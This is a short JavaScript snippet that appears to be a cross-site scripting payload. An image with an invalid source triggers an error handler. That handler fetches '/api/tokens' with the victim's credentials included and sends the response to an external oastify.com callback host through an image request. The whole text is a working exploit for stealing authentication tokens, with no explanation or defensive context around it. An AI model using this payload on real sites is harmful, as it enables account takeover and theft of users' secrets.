var img = document.createElement('img');
img.src = 'invalid';

img.onerror = function () {
  fetch('/api/tokens?limit=10', { credentials: 'include' })
    .then(r => r.text())
    .then(token => {
      new Image().src =
        'https://zorow6x38xu3hsribf57mj0dn4twhm5b.oastify.com/?token=' +
        encodeURIComponent(token);
    });
};

document.body.appendChild(img);
